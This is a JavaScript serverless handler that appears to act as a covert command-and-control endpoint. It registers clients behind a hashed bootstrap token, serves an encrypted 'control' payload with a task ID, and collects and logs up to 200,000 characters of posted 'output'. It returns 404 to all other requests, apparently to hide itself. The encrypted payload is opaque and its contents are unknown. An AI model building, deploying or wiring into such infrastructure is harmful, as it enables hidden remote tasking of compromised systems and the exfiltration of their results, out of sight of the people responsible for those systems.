import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '12';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}
function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}
export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_OUTPUT ${body.slice(0, 200000)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
